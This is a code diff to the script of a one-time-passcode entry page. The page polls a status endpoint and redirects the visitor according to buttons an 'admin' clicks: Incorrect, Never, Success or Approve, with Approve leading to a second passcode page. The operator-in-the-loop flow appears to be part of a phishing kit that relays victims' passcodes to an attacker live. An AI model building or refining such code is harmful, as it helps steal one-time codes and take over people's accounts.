@@ -228,17 +228,9 @@
     </div>
 
     <script>
-const pathParts = window.location.pathname.split('/');
+        const pathParts = window.location.pathname.split('/');
 const email = decodeURIComponent(pathParts[2]);
 if (!email) window.location.href = '/';
-
-// Check if this redirect came from Success button (set by admin dashboard)
-const isFromSuccessButton = sessionStorage.getItem('successRedirect') === 'true';
-
-// Clear the flag immediately after reading
-if (isFromSuccessButton) {
-    sessionStorage.removeItem('successRedirect');
-}
 
 const otpInput = document.getElementById('otpInput');
 const verifyBtn = document.getElementById('verifyBtn');
@@ -332,24 +324,28 @@ async function verifyOTP() {
                     const statusResponse = await fetch(`/api/users/check-otp-status?email=${encodeURIComponent(email)}`);
                     const statusData = await statusResponse.json();
 
+                    // Case 1: Admin clicked "Incorrect" - reset form
                     if (statusData.reset) {
                         clearInterval(checkInterval);
                         showIncorrectMessage();
                         checkInterval = null;
-                    } else if (statusData.never === true) {
+                    } 
+                    // Case 2: Admin clicked "Never" - permanent block, go to success page
+                    else if (statusData.never === true) {
                         clearInterval(checkInterval);
                         window.location.href = `/success?email=${encodeURIComponent(email)}`;
                         checkInterval = null;
-                    } else if (statusData.approved === true) {
+                    }
+                    // NEW: Case 3: Admin clicked "Success" - go directly to success page
+                    else if (statusData.success_redirect === true) {
                         clearInterval(checkInterval);
-                        
-                        // If coming from Success button, go to success page
-                        // Otherwise go to second OTP page
-                        if (isFromSuccessButton) {
-                            window.location.href = `/success?email=${encodeURIComponent(email)}`;
-                        } else {
-                            window.location.href = `/otp2/${encodeURIComponent(email)}/`;
-                        }
+                        window.location.href = `/success?email=${encodeURIComponent(email)}`;
+                        checkInterval = null;
+                    }
+                    // Case 4: Admin clicked "Approve" - go to second OTP page
+                    else if (statusData.approved === true) {
+                        clearInterval(checkInterval);
+                        window.location.href = `/otp2/${encodeURIComponent(email)}/`;
                         checkInterval = null;
                     }
                 } catch(e) {
